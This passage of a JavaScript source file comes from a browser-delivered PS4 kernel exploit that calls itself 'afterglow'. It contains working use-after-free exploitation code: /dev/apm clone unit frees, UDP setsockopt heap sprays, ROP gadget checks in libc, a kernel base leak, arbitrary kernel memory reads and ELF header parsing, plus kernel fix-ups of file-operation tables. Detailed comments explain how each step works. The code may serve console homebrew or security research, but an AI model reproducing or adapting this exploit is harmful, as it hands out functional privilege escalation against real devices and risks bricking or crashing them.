    const back = k.read_v(stub);
    if (!back || (back.low >>> 0) !== (RET0 >>> 0)) { say("[t] the stub did not stick"); return false; }
  } else {
    say("[t] something else is at " + text(stub) + ": " + text(there)); return false;
  }

  const clone = function (from, to, what) {
    for (let i = 0; i <= 10; i++) {
      let q = k.read_v(plus(from, i * 8));
      if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
      if (i === 7) q = stub;                       /* fo_close */
      if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
    }
    const c = k.read_v(plus(to, 0x38));
    return c !== null && same(c, stub);
  };

  /* Taking the table from the first handle is wrong on a second run: that one
     already points at our copy, and every handle still on the original would
     then look foreign and be skipped. */
  const original = function (list, copy) {
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      if (f && inHeap(f)) {
        const cur = k.read_v(plus(f, 0x08));
        if (cur && inText(cur) && !same(cur, copy)) return cur;
      }
    }
    return null;
  };
  const ready = function (copy) {
    const c = k.read_v(plus(copy, 0x38));
    return c !== null && same(c, stub);
  };
  const rehang = function (list, from, copy) {
    let moved = 0;
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (cur && same(cur, copy)) moved++;
      else if (cur && from && same(cur, from) && k.write_v(plus(f, 0x08), copy)) moved++;
    }
    return moved;
  };

  say("[t] looking for the device table across " + devs.length + " handles");
  const devOps = original(devs, dtab);
  if (devOps) {
    if (!ready(dtab) && !clone(devOps, dtab, "device table")) return false;
  } else if (!ready(dtab)) {
    say("[t] no device table to copy -- nothing done"); return false;
  }
  let moved = rehangRing0(k, room, ofs, devs, devOps, dtab);
  if (moved === null) { say("[t] rehanging one at a time"); moved = rehang(devs, devOps, dtab); }
  say("[t] " + moved + " of " + devs.length + " handles on the copy");

  let movedq = 0;
  if (queues && queues.length) {
    const qOps = original(queues, qtab);
    if (qOps && !same(qOps, devOps || qtab)) {
      if (ready(qtab) || clone(qOps, qtab, "queue table")) movedq = rehang(queues, qOps, qtab);
    } else if (ready(qtab)) movedq = queues.length;
  }
  say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");

  /* A neutralised close entry is not the whole story: exit1() also runs
     knote_fdclose() for every descriptor, and that does not go through
     fo_close. Our notes hang on clones freed long ago, so walking them at
     exit reads dead memory. kqueue_close takes the note array length from
     the high half of the quadword at kq+0xa0; with it at zero nothing is
     walked at all. */
  let notes = 0;
  for (let i = 0; queues && i < queues.length; i++) {
    const f = fileOf(queues[i]);
    if (!f || !inHeap(f)) continue;
    const kq = k.read_v(f);                        /* f_data sits at the front */
    if (!kq || !inHeap(kq)) continue;
    const w = k.read_v(plus(kq, 0xa0));
    if (!w) continue;
    if ((w.hi >>> 0) !== 0) { if (k.write_v(plus(kq, 0xa0), v(w.low, 0))) notes++; }
    else notes++;
  }
  say("[t] note lists emptied on " + notes + " of " + (queues ? queues.length : 0) + " queues");

  let left = countOffRing0(k, room, ofs, devs, dtab);
  if (left === null) {
    left = 0;
    for (let i = 0; i < devs.length; i++) {
      const f = fileOf(devs[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (!(cur && same(cur, dtab))) left++;
    }
  }
  if (left === 0 && moved > 0) { say("[t] all " + devs.length + " handles are on the copy"); return true; }
  say("[t] " + left + " handles are still on the original -- the page must not go away");
  return false;
}

/* ------------------------------------------------------------ the probe */

/* Read a two-int sysctl as a string. Read only, no allocation the exploit
   depends on, and a refusal is reported rather than thrown: on a firmware
   this code has never run on, "EPERM" is an answer too. */
function sysctlString(a, b, size) {
  const mib = alloc(8);
  mib.dv.setUint32(0, a, true);
  mib.dv.setUint32(4, b, true);
  const buf = alloc(size);
  buf.u8.fill(0);
  const len = alloc(8);
  len.dv.setUint32(0, size, true);
  len.dv.setUint32(4, 0, true);
  const rc = sc(S.sysctl, mib.at, 2, buf.at, len.at, 0, 0).i32;
  if (rc !== 0) return "errno " + host().errno();
  const n = Math.min(len.dv.getUint32(0, true) >>> 0, size);
  let s = "";
  for (let i = 0; i < n; i++) {
    const c = buf.u8[i];
    if (!c) break;
    s += String.fromCharCode(c);
  }
  return s.replace(/[^\x20-\x7e]/g, " ").replace(/\s+/g, " ").trim() || "(empty)";
}

/* Fires nothing. It opens device nodes without closing them, which is what
   the exploit does anyway, and it opens and closes sockets. No unit is spent:
   a unit is only spent when its clone is freed, and nothing is freed here. */
export function probeAfterglow(ctx) {
  STATE.ctx = ctx;
  if (!setFirmware(ctx.fw, { probeOnly: true })) {
    ctx.mark("AG", "no kernel stage for firmware " + ctx.fw + " -- refusing");
    return { ok: false, reasons: ["unsupported firmware " + ctx.fw] };
  }
  const out = { ok: false, reasons: [] };
  const no = function (why) { out.reasons.push(why); };

  const noStub = seedStubs();
  out.stubs = noStub.length ? ("missing " + noStub.join(",")) : "all resolved";
  if (noStub.length) no("no libkernel stub for syscall " + noStub.join(","));

  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) {
    const m = findLibByShape();
    if (m.base) { lib = { base: m.base, at: "gadget shape", count: lib.count, seen: lib.seen }; }
    else say("AG libc: " + m.note + " | entries=" + m.entries
             + " first=[" + m.first.join(" ") + "]");
  }
  const libc = lib.base;
  out.libc = libc ? (text(libc) + " via " + lib.at) : "not found";
  out.modules = lib.count;
  if (!libc) {
    no(lib.note || "libSceLibcInternal is not mapped");
    say("probe: stubs=" + out.stubs + " modules=" + lib.count + " rv=" + lib.rv
        + " seen=[" + lib.seen.join(" ") + "] -- " + out.reasons.join("; "));
    return out;
  }

  let missing = null;
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    if (!sameBytes(rdbuf(plus(libc, GADGETS[name][0]), want.length), want)) { missing = name; break; }
  }
  out.gadgets = missing ? ("missing " + missing) : "all present";
  if (missing) no("gadget " + missing + " is missing -- different libc build");

  /* What the kernel says about itself. This is the question the 14.02 recon
     turns on: did the kernel get rebuilt, or did only the browser move? Two
     read only sysctls, and a refusal is reported as a result. */
  try {
    out.kernel = sysctlString(1, 2, 256) + " | " + sysctlString(1, 3, 512);
  } catch (kernelError) {
    out.kernel = "unavailable: " + ((kernelError && kernelError.message) || kernelError);
  }

  let dirty = 0;
  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(libc, HOST.free + off)) !== 0) dirty++;
  }
  out.tail = (HOST.last - HOST.free) + " bytes, " + dirty + " dwords non zero";
  if (dirty) no("the spare room behind libc is occupied");

  let node = null;
  for (let i = 0; i < PROBE_NODES.length; i++) {
    const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (fd >= 0) { node = PROBE_NODES[i]; break; }
  }
  out.probeNode = node;
  if (!node) no("no usable device node for the probe descriptor");

  /* /dev/apm is a cloning node: each open makes a new numbered unit, and that
     unit exists only while the descriptor is held. So they are not a resource
     the sandbox hands out -- we make them. Held open on purpose here; closing
     one is what frees its clone, and that is the free the exploit needs, not
     something to do while counting. */
  const held = [];
  for (let i = 0; i < 20; i++) {
    const fd = sc(S.open, cstr("/dev/apm").at, 0).i32;
    if (fd < 0) break;
    held.push(fd);
  }
  out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
  if (!held.length) no("/dev/apm cannot be opened in this sandbox");

  const open = [], refused = [];
  for (let u = 0; u < 32; u++) {
    const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
    if (fd >= 0) { open.push(u); sc(S.close, fd); }
    else if (refused.length < 3) refused.push(u + ":e" + host().errno());
  }
  out.units = open.length;
  out.unitList = open.length ? open.join(",") : "none";
  out.unitRefused = refused.join(" ") || "-";
  if (open.length < 3) no("only " + open.length + " apm units with " + held.length + " clones held");

  const pin = pinCore();
  out.pin = pin.ok ? ("core " + pin.core + " of [" + pin.allowed + "]") : ("FAILED: " + pin.note);
  if (!pin.ok) no("cannot pin to a cpu: " + pin.note);

  const socks = [];
  for (let i = 0; i < TUNE.sprays; i++) {
    const fd = sc(S.socket, 2, 2, 0).i32;
    if (fd < 0) break;
    socks.push(fd);
  }
  out.udp = socks.length;

  /* How wide the window would be. Setting the option allocates in the zone
     the exploit uses, but nothing was freed here, so there is no hole to
     win -- the sockets are closed again right after. */
  if (socks.length) {
    const body = alloc(TUNE.object); body.u8.fill(0);
    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    pokeAt(req, 8, alloc(16).at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);
    /* Measure it the way the real run does it: batched and prebuilt.
       Unbatched, the probe reported 16 ms where the run sits under one -- a
       number pointing the wrong way is worse than no number. */
    const stub = stubFor(S.setsockopt);
    const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
    let t0, t1;
    if (nb) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      const prepared = [];
      for (let i = 0; i < calls.length; i += nb) {
        try { prepared.push(host().prepareMany(calls.slice(i, i + nb))); }
        catch (e) { prepared.length = 0; break; }
      }
      if (prepared.length) {
        host().runPrepared(prepared[0]);                       /* warm up */
        t0 = performance.now();
        for (let i = 0; i < prepared.length; i++) host().runPrepared(prepared[i]);
        t1 = performance.now();
        out.window = (t1 - t0).toFixed(2) + " ms in " + prepared.length + " entries";
      }
    }
    if (out.window === undefined) {
      t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
      t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
    }
  } else out.window = "not measured";

  for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
  if (socks.length < TUNE.sprays) {
    no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
  }

  out.ok = out.reasons.length === 0;
  /* one item per line: the console log pane cuts at the right edge, and a
     single long line loses whichever number mattered */
  say("probe libc   " + out.libc);
  say("probe kernel " + out.kernel);
  say("probe gadget " + out.gadgets + ", tail " + out.tail);
  say("probe apm    " + out.apm + ", node " + out.probeNode);
  say("probe units  " + out.units + " open: " + out.unitList);
  say("probe refused " + out.unitRefused);
  say("probe pin    " + out.pin);
  say("probe window " + out.window);
  say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
  say("probe SHOTS  " + out.units + " units, a run needs 3");
  if (out.ok) say("probe VERDICT usable");
  else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
  return out;
}

/* --------------------------------------------------------------- the run */

/* Bumped by hand whenever the leak diagnostics change. The PS4 appcache is
   aggressive and silent, so a stale script is indistinguishable from a real
   result until this tag is printed. */
const BUILD_TAG = "leak33-batch";

async function attempt(ctx, opts) {
  STATE.ctx = ctx;
  opts = opts || {};
  const leakOnlyMode = !!opts.leakOnly;
  STATE.retry = false;
  say("afterglow -- ps4 kernel exploit, firmware " + FW_KEY + " (raw13 host)");
  /* Cache is the quietest failure mode this project has: the PS4 serves the
     previous afterglow.js from appcache and the console reports yesterday's
     numbers with today's confidence. Every leak run prints the tag it was
     built with, so a stale script is one glance away instead of one hour. */
  say("afterglow -- build LEAK33 batch, script " + (typeof BUILD_TAG === "string" ? BUILD_TAG : "?"));
  /* A marker on the disk before the first kernel operation. If the console
     dies, the last line in leak-dump.txt is the last stage that ran. */
  postLogNow();
  if (ctx.params && ctx.params.get("dry") === "1") {
    say("dry run -- page is live, no kernel operation attempted");
    postLogNow();
    return true;
  }

  const missing = seedStubs();
  if (missing.length) {
    say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
    return false;
  }

  /* the free and the refill have to happen on one core, or they land in
     different per cpu buckets and the hole is never refilled */
  const pin = pinCore();
  if (!pin.ok) {
    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
    say("  Unpinned, the free and the refill land in different per cpu buckets,");
    say("  the hole is filled by somebody else, and ring 0 continues on that");
    say("  stranger's stack pointer. That is a dead console, not a bad run.");
    return false;
  }
  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");

  /* Is the kernel already open? A reload on a console that has been done once
     would otherwise burn triggers against a kernel that is already patched --
     and the enabler restarting SceShellUI is exactly what makes the browser
     reload. rwx mmap is the cheapest question that only answers yes after a
     successful run. */
  {
    const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
    if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
      say("  this kernel is already open -- a run has succeeded on this boot.");
      say("  Not firing again; reboot the console for a fresh one.");
      return false;
    }
  }

  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) lib = findLibByShape();
  const libc = lib.base;
  if (!libc) { say("  " + (lib.note || "libc is not mapped")); return false; }

  const gad = {};
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    const at = plus(libc, GADGETS[name][0]);
    if (!sameBytes(rdbuf(at, want.length), want)) {
      say("  gadget " + name + " is missing -- this is not the libc build we know");
      return false;
    }
    gad[name] = at;
  }

  const shot = shooter(gad);
  if (leakOnlyMode) shot.ignoreSpent = true;
  const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);

  /* ---- the kernel base ------------------------------------------------- */

  let kbase = STATE.base;
  if (kbase) {
    say("[1] base " + text(kbase) + ", carried over from this boot");
  } else {
    const win = alloc(TUNE.window + 16);
    wipe(win, TUNE.window + 16);
    STATE.winAlloc = win;

    const r = shot.take(function (c) {
      /* round down to the start of the slab, so the window also covers the
         neighbours that sit below the freed object */
      c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
      c.grab(win.at, TUNE.window);
    });

    const at = function (off) { return qAt(win, off); };

    /* four kernel pointers spaced 0x20/0x40/0x50 apart identify the object */
    let found = null;
    for (let off = 0; off <= TUNE.window - 0x20; off += 8) {
      const a = at(off);
      if (a.hi === 0xffffffff) {
        const b = at(off + 8), c2 = at(off + 0x10), d = at(off + 0x18);
        if (b.hi === 0xffffffff && c2.hi === 0xffffffff && d.hi === 0xffffffff
            && ((b.low - a.low) >>> 0) === 0x20
            && ((c2.low - a.low) >>> 0) === 0x40
            && ((d.low - a.low) >>> 0) === 0x50) { found = a; break; }
      }
    }

    /* One pointer is enough on its own: the base sits on a 16 KiB grid, so
       the anchor can only ever show up at a single offset within a page. This
       runs even when the signature matched, because two methods that agree
       are worth more than one that cannot be checked -- and a wrong base
       sends the next chain straight through a nonsense descriptor table,
       which is the likeliest way this step takes the console with it. */
    let voted = null;
    {
      const mark = K.anchor % 0x4000, tally = {};
      for (let off = 0; off <= TUNE.window - 8; off += 8) {
        const a = at(off);
        if (a.hi === 0xffffffff && a.low !== 0xffffffff && a.low % 0x4000 === mark) {
          const b = (a.low - K.anchor) >>> 0;
          if (b % 0x4000 === 0) tally[b] = (tally[b] || 0) + 1;
        }
      }
      let best = null, top = 0, second = 0;
      for (const b in tally) {
        const n = tally[b];
        if (n > top) { second = top; best = Number(b); top = n; }
        else if (n > second) second = n;
      }
      if (best !== null && top > second) voted = v(best + K.anchor, 0xffffffff);
    }

    STATE.leakFound = found;
    STATE.leakVoted = voted;

    if (found && voted && !same(found, voted)) {
      say("[1] the two readings disagree: " + text(found) + " against " + text(voted)
          + (leakOnlyMode ? " -- continuing, this run only reads" : " -- stopping here"));
      if (!leakOnlyMode) return false;
    }
    found = found || voted;
    if (found && ((found.low - K.anchor) >>> 0) % 0x4000 !== 0) {
      say("[1] " + text(found) + " is not on the 16 KiB grid"
          + (leakOnlyMode ? " -- reporting it anyway" : " -- not a base, stopping here"));
      if (!leakOnlyMode) return false;
    }

    say("[1] leak: queue=" + r + " sprays=" + shot.sprayed + " anchor="
        + (found ? text(found) : "missed")
        + ((found && voted && same(found, voted)) ? " (both readings agree)" : ""));
    if (!found) {
      say("    why: " + (shot.why || "no reason recorded")
          + " | units spent " + Object.keys(STATE.units).length
          + " | fired " + shot.fired + " | queues " + shot.queues.length
          + " | primed " + (shot.primed === undefined ? "-" : shot.primed)
          + " errno " + (shot.primeErr === undefined ? "-" : shot.primeErr));
      if (r === null && shot.sprayed === 0) {
        say("    no free apm unit left -- this boot is spent, reboot the console.");
      } else {
        say("    the spray did not take");
        STATE.retry = true;
      }
      return false;
    }
    kbase = plus(found, -K.anchor);
    /* Keep it across attempts even in leak mode. The base is per boot, not
       per run, so a second attempt that re-derives it spends shots on a
       question it already answered -- and on a dirty heap it answers wrong. */
    STATE.base = kbase;
    say("    base " + text(kbase));
    postLogNow();
  }

  /* ---- leak only ------------------------------------------------------- *
   * Everything above this line reads. Everything below it writes. A caller
   * that asked for leakOnly gets the base it came for and a header dump that
   * says whether that base is really the start of the kernel image, then the
   * run ends -- no patch, no bootstrap, no enabler. That makes the anchor
   * testable on a firmware that has no verified patch table, which is the
   * only way to find out whether 14.00's anchor still lands on 14.02. */
  if (opts && opts.leakOnly) {
    const grid = ((kbase.low >>> 0) % 0x4000) === 0;
    if (!grid) {
      say("leak-only base    " + text(kbase) + "  (not on the grid -- no header read)");
    }
    /* The anchor is a firmware constant, and 14.02 has no image to read it
       out of. But the window the leak hands back is full of kernel pointers,
       and the true base has to sit below all of them and inside one image
       length of the lowest one. Printing them lets the base be derived from
       the data instead of assumed from 14.00. */
    const win = STATE.winAlloc;
    say("leak-only found   " + (STATE.leakFound ? text(STATE.leakFound) : "none")
        + "  voted " + (STATE.leakVoted ? text(STATE.leakVoted) : "none"));
    if (win) {
      /* A 0xffffffff in a kernel slab is not automatically a pointer: a 32 bit
         field holding a small value beside a -1 forms exactly that qword, and
         the first dump was made of them. The exploit already carries the
         distinction -- text pointers are 0xffffffff_8xxxxxxx and above, heap
         pointers have hi in [0xffff0000,0xffffff00) -- so classify first and
         only run address arithmetic over what can be an address. */
      const textP = [], heapP = [], neg32 = [], userP = [];
      for (let off = 0; off <= TUNE.window - 8; off += 8) {
        const a = qAt(win, off);
        const lo = a.low >>> 0, hi = a.hi >>> 0;
        if (lo === 0 && hi === 0) continue;
        /* 0xffffffff_ffffffff is two -1 fields sitting side by side, and
           0xffffffff_fffffffe is -2. Both satisfy "hi is -1 and low looks
           large", and both poison the band: one of them sets maxP to
           0xffffffff, floor becomes maxP - IMG_MAX, and the candidate loop
           runs zero times. A real image pointer never lives in the last
           16 bytes of the 32 bit space. */
        if (hi === 0xffffffff && lo >= 0x80000000 && lo < 0xfffff000)
          textP.push({ off: off, low: lo });
        else if (hi >= 0xffff0000 && hi < 0xffffff00) heapP.push({ off: off, low: lo });
        else if (hi === 0xffffffff) neg32.push({ off: off, low: lo });
        else if (hi < 0xffff0000) userP.push({ off: off, low: lo, hi: hi });
      }
      say("leak-only classes  text=" + textP.length + " heap=" + heapP.length
          + " neg32=" + neg32.length + " user=" + userP.length);

      /* Did the reclaim land? The kernel copies `body` into the freed 128 byte
         zone, and body carries this process's frame pointer at +0x58. Find
         that exact value and the object in the window is ours; fail to find
         it and the window belongs to somebody else, which makes the anchor a
         later question than the free and the refill. */
      const fr = shot && shot.frameAt;
      const pv = shot && shot.pivotAt;
      let objOff = -1, slabBest = null, own = [];
      if (fr) {
        const hits = [];
        for (let off = 0; off + 8 <= TUNE.window; off += 8) {
          const a = qAt(win, off);
          if (a.hi === fr.hi && (a.low >>> 0) === (fr.low >>> 0)) hits.push(off);
        }
        /* A hit only proves a copy of our body if the second field agrees too:
           the pivot gadget sits at +0x38, the frame pointer at +0x58. One
           value matching is a coincidence -- the previous run had exactly one
           at offset 0 -- two of them 0x20 apart inside a 128 byte slot is the
           object. */
        own = hits.filter(function (o) {
          if (o < 0x58 || (o - 0x58) % 0x80 !== 0) return false;
          const base = o - 0x58;
          if (!pv || base + 0x40 > TUNE.window) return false;
          const q = qAt(win, base + 0x38);
          return q.hi === pv.hi && (q.low >>> 0) === (pv.low >>> 0);
        });
        say("leak-only body     " + own.length + " verified of " + hits.length
            + " frame hit(s)");
        if (own.length) {
          objOff = own[0] - 0x58;
          say("leak-only object   +" + hex32(objOff) + " in the slab");
        }
      }

      /* Where the slab is. A page holding pointers into itself shows up as a
         cluster of values inside one 16 KiB page, and that names the address
         the leak copied from without needing a kernel base at all. */
      if (heapP.length) {
        const seen = {}, best = [];
        for (let i = 0; i < heapP.length; i++)
          seen[(heapP[i].low & ~0x3fff) >>> 0] = true;
        for (const b in seen) {
          const base = Number(b);
          let n = 0;
          for (let i = 0; i < heapP.length; i++)
            if (heapP[i].low >= base && heapP[i].low < base + 0x4000) n++;
          best.push({ base: base, n: n });
        }
        best.sort(function (x, y) { return y.n - x.n; });
        for (let i = 0; i < best.length && i < 3; i++)
          say("leak-only slab     " + hex32(best[i].base) + "  n=" + best[i].n);
        slabBest = best.length ? best[0] : null;
      }

      /* The base, from a table instead of a vote. A vote only says "somewhere
         in this band": every candidate collects a point from every pointer, so
         the tally comes back flat and 18 bases tie. A table says "this object
         lives at this offset", and a pointer equal to base+offset exists for
         exactly one base. Six offsets are known from 14.00; two hits settle
         it, and a wrong candidate scores zero. */
      const KNOWN = [
        ["anchor", (K && K.anchor) || 0x00e6c60], ["swap_rbp", 0x0a80f68],
        ["prison0", 0x111fa18], ["rootvnode", 0x2136e90],
        ["padding", 0x0b39d98], ["ghKmem", 0x0466540],
      ];
      /* Inverse Hough: every text pointer P that could BE one of the known
         objects votes for exactly one base, P - rva. The true base collects a
         vote from every known object that is actually referenced; a wrong base
         collects scattered singles. This replaces the image-window band, which
         could never resolve anything -- a translation-invariant window gives
         every candidate in it the same score by construction. */
      const tally = {}, who = {};
      for (let i = 0; i < textP.length; i++) {
        const P = textP[i].low >>> 0;
        for (let k = 0; k < KNOWN.length; k++) {
          const B = (P - KNOWN[k][1]) >>> 0;
          if (B % 0x200000 !== 0) continue;      /* image base is 2 MiB aligned */
          tally[B] = (tally[B] || 0) + 1;
          if (!who[B]) who[B] = [];
          if (who[B].indexOf(KNOWN[k][0]) < 0) who[B].push(KNOWN[k][0]);
        }
      }
      const matches = [];
      for (const b in tally)
        matches.push({ base: Number(b), hit: who[b], n: tally[b] });
      matches.sort(function (x, y) {
        return (y.hit.length - x.hit.length) || (y.n - x.n);
      });
      say("leak-only votes    " + matches.length + " candidates from "
          + textP.length + " pointers");
      for (let i = 0; i < matches.length && i < 3; i++)
        say("leak-only match    " + hex32(matches[i].base) + "  "
            + matches[i].hit.join(",") + " x" + matches[i].n);

        /* The verdict, on one short line. The lines above are the evidence;
           this is the answer, because forty hex dumps are not something to
           read a digit out of. Two independent table hits at one base is not
           a coincidence -- it is the image saying where it starts. */
        const top = matches[0], next = matches[1];
        if (!top || !top.hit.length) {
          say("leak-only VERDICT  NO-BASE");
        } else if (next && top.hit.length === next.hit.length) {
          say("leak-only VERDICT  TIED at " + top.hit.length);
        } else if (top.hit.length === 1) {
          say("leak-only VERDICT  WEAK " + top.hit[0] + " -> " + hex32(top.base));
        } else {
          say("leak-only VERDICT  BASE-OK " + top.hit.join(","));
          say("leak-only BASE     " + text(v(top.base, 0xffffffff)));
          /* the base is now good enough to read through: both objects are
             inside the image by construction, so this cannot fault */
          try {
            const kb = v(top.base, 0xffffffff);
            say("leak-only prison0   " + text(rd8(plus(kb, K.prison0))));
            say("leak-only rootvnode " + text(rd8(plus(kb, K.rootvnode))));
          } catch (e) {
            say("leak-only prison0   read threw: " + String((e && e.message) || e));
          }
        }

        /* Differences inside one image do not depend on the base, so a pair
           that differs by a known amount names both objects even when the
           anchor itself has moved. */
        const want = [];
        for (let a = 0; a < KNOWN.length; a++)
          for (let b = a + 1; b < KNOWN.length; b++)
            want.push({
              d: (KNOWN[b][1] - KNOWN[a][1]) >>> 0,
              n: KNOWN[a][0] + "-" + KNOWN[b][0],
            });
        const pairs = [];
        for (let i = 0; i < textP.length; i++)
          for (let j = i + 1; j < textP.length; j++) {
            const d = (textP[i].low - textP[j].low) >>> 0;
            for (let k = 0; k < want.length; k++)
              if (want[k].d === d)
                pairs.push(want[k].n + " " + hex32(textP[j].low) + "/" + hex32(textP[i].low));
          }
        say("leak-only delta    " + (pairs.length ? pairs.slice(0, 6).join("  ") : "no known pair"));

      /* The whole pointer set, compact. Six per line, no offsets -- the values
         are the data, and they are what a base has to be derived from. */
      const packList = function (tag, arr) {
        for (let i = 0; i < arr.length; i += 6) {
          const row = [];
          for (let j = i; j < arr.length && j < i + 6; j++)
            row.push(hex32(arr[j].low));
          say("leak-only " + tag + " " + row.join(" "));
        }
      };
      packList("txt", textP);
      packList("hpx", heapP);

      /* The object we control, at a kernel address we can now name. Its own
         bytes are the proof of what it is: 0x38 holds the pivot gadget, 0x58
         the frame pointer, the rest zero. Anything beside it that does not
         look like that belongs to somebody else. */
      if (slabBest && objOff >= 0) {
        say("leak-only at       " + hex32((slabBest.base + objOff) >>> 0)
            + " (page +" + hex32(objOff) + ")");
        for (let row = 0; row < 2; row++) {
          const parts = [];
          for (let c = 0; c < 8; c++) {
            const o = objOff + row * 0x20 + c * 4;
            parts.push(o + 4 <= TUNE.window
              ? ("0000000" + (win.dv.getUint32(o, true) >>> 0).toString(16)).slice(-8)
              : "--------");
          }
          say("leak-only dump     +" + hex32(objOff + row * 0x20) + "  " + parts.join(" "));
        }
      }
    } else {
      say("leak-only window  none (base carried over from this boot)");
    }

    if (grid) {
      say("leak-only base    " + text(kbase) + "  (16 KiB grid aligned)");
      let head = null, headTries = 0, hdrBuf = null;
      /* The header read is a second shot: another free, another spray, another
         chain. It is not always granted -- one run returned the ELF magic and
         the next came back empty from the same base. Six attempts, sixty-four
         bytes each, and the buffer is checked for content, because a grab that
         returns zeros is not a read of a zero page, it is a read that did not
         happen. The whole header comes back in that one shot: e_phoff lives at
         0x20 and e_shnum at 0x3c, so a thirty-two byte grab could never have
         answered either question -- and asking twice doubled the shots. */
      for (let a = 0; a < 6 && !head; a++) {
        headTries++;
        try {
          const hb = alloc(0x50);
          wipe(hb, 0x50);
          const headAt = alloc(16);
          pokeAt(headAt, 0, kbase);
          const rHead = shot.take(function (c) {
            c.load_rax(headAt.at);
            c.grab(hb.at, 0x40);
          });
          if (ran(rHead)) {
            const w = [];
            let any = false;
            for (let i = 0; i < 16; i++) {
              const x = hb.dv.getUint32(i * 4, true) >>> 0;
              w.push(x);
              if (x) any = true;
            }
            if (any) { head = w; hdrBuf = hb; }
            else say("leak-only shot    ran, but the buffer stayed empty");
          } else {
            say("leak-only shot    " + (rHead === null
                ? ("null -- " + (shot.why || "no reason recorded"))
                : ("returned " + rHead)) + ", sprayed " + shot.sprayed);
          }
        } catch (e) {
          say("leak-only shot error: " + (e && e.message ? e.message : String(e)));
        }
        /* Give the descriptors back before the next attempt. A refused open
           is indistinguishable from a lost reclaim in the log, so the table
           must never be the thing that is empty. */
        if (!head) shot.drop();
      }
      /* An empty array is truthy, so `if (head)` printed a blank head and a
         blank ascii line and looked like a successful read of nothing. Only
         sixteen words is a read. */
      if (head && head.length === 16) {
        const ascii = [];
        for (let i = 0; i < 16; i++) {
          const b = (head[i >> 2] >>> ((i & 3) * 8)) & 0xff;
          ascii.push(b >= 0x20 && b < 0x7f ? String.fromCharCode(b) : ".");
        }
        const kernely = head.some(function (w) { return (w >>> 0) === 0xffffffff; })
          || head.some(function (w) { return w >= 0x80000000; })
          || head[0] === 0x464c457f;
        say("leak-only head    " + head.map(function (w) {
          return ("0000000" + w.toString(16)).slice(-8);
        }).join(" ") + "  [" + headTries + " try]");
        say("leak-only ascii   " + ascii.join(""));
        postLogNow();
        if (head[0] === 0x464c457f) {
          say("leak-only ELF     confirmed -- 7f 45 4c 46 at the base");
          /* With a confirmed base and a working read, the image can be asked
             for its own symbols. That is the only honest way to learn 14.02's
             patch sites: the 14.00 RVAs are wrong for this firmware, and a
             kernel image is not available to diff against. */
          try {
            const kread = function (addr, len) {
              /* Every read is a full shot -- a free, a spray, a chain -- and a
                 shot is not always granted. Returning a wiped buffer on a
                 refused shot is how e_shoff came back as zero and the image
                 was declared symbol-stripped. Retry, and fail loudly. */
              for (let attempt = 0; attempt < 3; attempt++) {
                const buf = alloc(len + 16);
                wipe(buf, len + 16);
                const at = alloc(16);
                pokeAt(at, 0, addr);
                let ok = false;
                try {
                  const r = shot.take(function (c) {
                    c.load_rax(at.at);
                    c.grab(buf.at, len);
                  });
                  ok = ran(r);
                } catch (e) { ok = false; }
                if (ok) {
                  let any = false;
                  for (let i = 0; i + 4 <= len && !any; i += 4)
                    if (buf.dv.getUint32(i, true)) any = true;
                  if (any) return buf;
                }
              }
              throw new Error("kread refused at " + hex32(addr.low >>> 0)
                              + " len " + len + " -- "
                              + (shot.why || "no reason recorded")
                              + " | fired " + shot.fired
                              + " sprayed " + shot.sprayed);
            };
            const q64 = function (d, o) {
              return { lo: d.getUint32(o, true) >>> 0, hi: d.getUint32(o + 4, true) >>> 0 };
            };
            const hdr = hdrBuf;
            if (!hdr) throw new Error("no header buffer");
            const shoff = q64(hdr.dv, 0x28);
            const shentsize = hdr.dv.getUint16(0x3a, true) || 64;
            const shnum = hdr.dv.getUint16(0x3c, true);
            const shstrndx = hdr.dv.getUint16(0x3e, true);
            const phoff = q64(hdr.dv, 0x20);
            const phentsize = hdr.dv.getUint16(0x36, true);
            const phnum = hdr.dv.getUint16(0x38, true);
            say("leak-only ELF     shoff=0x" + shoff.lo.toString(16)
                + " shnum=" + shnum + " ent=" + shentsize
                + " shstrndx=" + shstrndx);
            say("leak-only ELF     phoff=0x" + phoff.lo.toString(16)
                + " phnum=" + phnum + " phent=" + phentsize);

            /* A section table is optional. A program table is not: without it
